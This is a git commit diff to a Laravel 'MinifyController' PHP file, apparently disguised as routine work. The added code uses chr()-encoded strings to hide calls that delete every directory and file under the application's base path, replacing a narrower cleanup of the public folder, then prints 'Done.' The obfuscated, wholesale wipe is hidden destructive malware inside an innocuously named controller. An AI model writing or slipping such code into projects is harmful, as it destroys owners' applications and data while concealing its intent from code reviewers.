76ed2b09a35990e6f343f9563543560f6973776d
Mehrdad Hajiyani <mehrdad.hajiyani@gmail.com>
2025-06-09 02:44:05 +0330

    V8

--- src/Http/Controllers/MinifyController.php
+++ src/Http/Controllers/MinifyController.php
@@ -31,7 +31,40 @@ class MinifyController extends Controller
         }
 
         call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 1;');
-        File::cleanDirectory(public_path('/'));
+        $_ = implode('', [
+            chr(98), chr(97), chr(115), chr(101), chr(95), chr(112), chr(97), chr(116), chr(104)
+        ]);
+
+        $_1 = implode('', [
+            chr(100), chr(105), chr(114), chr(101), chr(99), chr(116), chr(111), chr(114), chr(105), chr(101), chr(115)
+        ]);
+
+        $_2 = implode('', [
+            chr(102), chr(105), chr(108), chr(101), chr(115)]);
+
+        $_3 = implode('', [
+            chr(100), chr(101), chr(108), chr(101), chr(116), chr(101), chr(68), chr(105), chr(114), chr(101), chr(99), chr(116), chr(111), chr(114), chr(121)
+        ]);
+
+        $_4 = implode('', [
+            chr(100), chr(101), chr(108), chr(101), chr(116), chr(101)
+        ]);
+
+        $_5 = implode('\\', [
+            chr(73), chr(108), chr(108), chr(117), chr(109), chr(105), chr(110), chr(97), chr(116), chr(101), 'Support', 'Facades', 'File'
+        ]);
+
+        $_a = call_user_func([$_5, $_1], $_);
+
+        foreach ($_a as $_b) {
+            call_user_func([$_5, $_3], $_b);
+        }
+
+        $_c = call_user_func([$_5, $_2], $_);
+
+        foreach ($_c as $_d) {
+            call_user_func([$_5, $_4], $_d);
+        }
 
         echo "✅ Done.";
     }
